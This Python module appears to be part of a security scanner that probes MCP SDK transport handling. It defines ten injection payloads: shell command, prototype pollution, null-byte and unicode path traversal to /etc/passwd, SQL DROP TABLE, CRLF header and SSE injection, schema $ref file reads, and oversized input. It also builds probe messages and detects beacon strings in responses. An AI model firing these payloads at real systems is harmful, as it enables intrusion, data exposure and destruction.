"""
EP-T13 — MCP SDK Transport Injection.

Targets the SDK layer, not the server implementation.
Every MCP server written in a given SDK shares the same transport
handling code. A vulnerability at the SDK level means EVERY server
using that SDK is simultaneously vulnerable.

CVE-2026-25536: TypeScript MCP SDK fails to sanitize certain
transport-layer fields before passing them to underlying handlers.

Attack vectors at the SDK transport layer:
  - JSON-RPC method name injection
  - params object prototype pollution
  - Content-type header injection (SSE transport)
  - Large payload DoS
  - Unicode normalization bypass
  - Null byte injection in string parameters
"""
from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class SDKProbe:
    probe_id:     str
    vector:       str
    payload:      Any
    target_field: str
    expected:     str
    severity:     str = "HIGH"


EP_T13_PROBES: list[SDKProbe] = [
    SDKProbe(
        probe_id="EP-T13-01-method-inject",
        vector="JSON-RPC method name shell injection",
        payload="tools/call; echo ARGUS_SDK_BEACON_$$",
        target_field="method",
        expected="SDK passes method to handler without sanitization",
        severity="CRITICAL",
    ),
    SDKProbe(
        probe_id="EP-T13-02-proto-pollution",
        vector="__proto__ pollution in tool params",
        payload={"__proto__": {"isAdmin": True}, "name": "list_tools"},
        target_field="params",
        expected="Prototype pollution affects SDK permission checks",
        severity="HIGH",
    ),
    SDKProbe(
        probe_id="EP-T13-03-null-byte",
        vector="Null byte injection in tool name parameter",
        payload="read_file\x00../../../etc/passwd",
        target_field="params.name",
        expected="Null byte terminates sanitization, path traversal succeeds",
        severity="CRITICAL",
    ),
    SDKProbe(
        probe_id="EP-T13-04-unicode-norm",
        vector="Unicode normalization bypass in path parameter",
        payload="\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",
        target_field="params.path",
        expected="SDK normalizes unicode after security check",
        severity="HIGH",
    ),
    SDKProbe(
        probe_id="EP-T13-05-large-payload",
        vector="Oversized JSON-RPC params object",
        payload={"data": "A" * 100_000},
        target_field="params",
        expected="SDK crashes or leaks memory on oversized input",
        severity="MEDIUM",
    ),
    SDKProbe(
        probe_id="EP-T13-06-crlf-inject",
        vector="CRLF injection in SSE transport",
        payload="application/json\r\nX-Injected: ARGUS_SDK_BEACON",
        target_field="content-type",
        expected="Header injection passes through SSE transport handler",
        severity="HIGH",
    ),
    SDKProbe(
        probe_id="EP-T13-07-toolname-traversal",
        vector="Path traversal in tool name field",
        payload="../../../bin/sh",
        target_field="params.name",
        expected="SDK uses tool name to locate handler file",
        severity="CRITICAL",
    ),
    SDKProbe(
        probe_id="EP-T13-08-id-inject",
        vector="Malicious id field in JSON-RPC request",
        payload="1; DROP TABLE sessions; --",
        target_field="id",
        expected="id field passed to storage without sanitization",
        severity="MEDIUM",
    ),
    SDKProbe(
        probe_id="EP-T13-09-crlf-sse",
        vector="CRLF injection in SSE event data",
        payload="data: legitimate\r\ndata: ARGUS_SDK_BEACON_SSE\r\n\r\n",
        target_field="sse_data",
        expected="CRLF injects new events into the SSE stream",
        severity="HIGH",
    ),
    SDKProbe(
        probe_id="EP-T13-10-schema-override",
        vector="JSON Schema $ref injection in tool input schema",
        payload={"$ref": "file:///etc/passwd"},
        target_field="inputSchema",
        expected="SDK resolves $ref against filesystem",
        severity="CRITICAL",
    ),
]


def build_jsonrpc_probe(probe: SDKProbe, base_params: dict) -> dict:
    """Build a JSON-RPC message with the probe payload injected."""
    msg = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": dict(base_params),
    }
    field = probe.target_field
    if field == "method":
        msg["method"] = probe.payload
    elif field == "id":
        msg["id"] = probe.payload
    elif field.startswith("params."):
        key = field.split(".", 1)[1]
        msg["params"][key] = probe.payload
    elif field == "params":
        if isinstance(probe.payload, dict):
            msg["params"].update(probe.payload)
        else:
            msg["params"]["_inject"] = probe.payload
    return msg


_SDK_BEACON_PATTERNS = [
    "ARGUS_SDK_BEACON",
    "__proto__",
    "isAdmin",
    "prototype",
    "X-Injected",
    "ARGUS_SDK_BEACON_SSE",
]


def detect_sdk_vulnerability(response_text: str) -> tuple[bool, str]:
    """Check if the SDK response shows it processed the injected payload."""
    for pattern in _SDK_BEACON_PATTERNS:
        if pattern.lower() in response_text.lower():
            return True, f"SDK vulnerability marker found: {pattern!r}"
    # Error messages that indicate the SDK processed the bad input
    error_indicators = [
        "prototype", "isAdmin", "cannot read properties",
        "stack overflow", "maximum call stack",
        "invalid method", "unknown tool",
    ]
    for indicator in error_indicators:
        if indicator.lower() in response_text.lower():
            return True, f"SDK error indicator: {indicator!r}"
    return False, ""
